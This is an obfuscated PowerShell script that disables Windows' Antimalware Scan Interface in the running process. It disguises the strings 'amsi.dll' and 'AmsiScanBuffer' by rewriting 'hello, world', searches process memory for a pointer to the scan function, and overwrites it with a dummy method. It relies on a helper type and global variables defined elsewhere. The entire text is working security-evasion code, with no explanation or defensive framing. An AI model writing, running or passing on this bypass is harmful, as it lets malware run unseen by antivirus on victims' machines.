$bx = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aGVsbG8sIHdvcmxk')) # hello, world

$s1 = $bx.Replace('he','a').Replace('ll','m').Replace('o,','s').Replace(' ','i').Replace('wo','.d').Replace('rld','ll')
$s2 = $bx.Replace('he','A').Replace('ll','m').Replace('o,','s').Replace(' ','i').Replace('wo','Sc').Replace('rld','an')
$s3 = $bx.Replace('hello','Bu').Replace(', ','ff').Replace('world','er')

$m = [Q]::GetModuleHandle($s1)
$p = [Q]::GetProcAddress($m, $s2 + $s3)

$a = [AppDomain]::CurrentDomain.GetAssemblies()
$t = $a | Where-Object {
    $_.Location -and $_.FullName -match '^S.*n$' -and $_.FullName.Length -eq 28
} | ForEach-Object { $_.GetTypes() } | Select-Object -ExpandProperty Name -Unique | ForEach-Object {
    [AppDomain]::CurrentDomain.GetAssemblies() | ForEach-Object {
        $_.GetType($_)
    }
}

$mtd = $a | ForEach-Object {
    $_.GetTypes() | ForEach-Object {
        $_.GetMethods('Static,NonPublic') | Where-Object {
            $_.Name -match '^S.*t$' -and $_.Name.Length -eq 11
        }
    }
} | Select-Object -First 1

$fptr = $mtd.MethodHandle.GetFunctionPointer()
$proc = [Q]::GetCurrentProcess()
$ctr = 0
$memPatch = [IntPtr]::Zero

for ($i = ${GLOBAL:__x}; $i -lt ${GLOBAL:__z}; $i += ${GLOBAL:__y}) {
    $target = [Int64]$fptr - $i
    $buf = [byte[]]::new(${GLOBAL:__w})
    $ok = [Q]::ReadProcessMemory($proc, [IntPtr]$target, $buf, ${GLOBAL:__w}, [ref]$ctr)

    for ($j = 0; $j -lt ($buf.Length - 8); $j++) {
        $cmp = [BitConverter]::ToInt64($buf, $j)
        if ($cmp -eq $p) {
            Write-Host "✓ Found @ offset: $i, index: $j"
            $memPatch = [Int64]$target + $j
            $i = ${GLOBAL:__z}  # Exit outer loop
            break
        }
    }
}

if ($memPatch -ne [IntPtr]::Zero) {
    $dummy = [Q].GetMethod('N').MethodHandle.GetFunctionPointer()
    $patch = [IntPtr[]]($dummy)
    [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, [IntPtr]$memPatch, 1)
}

$elapsed = (Get-Date) - ${GLOBAL:__t}
Write-Host "Time Elapsed: $($elapsed.TotalSeconds) seconds"
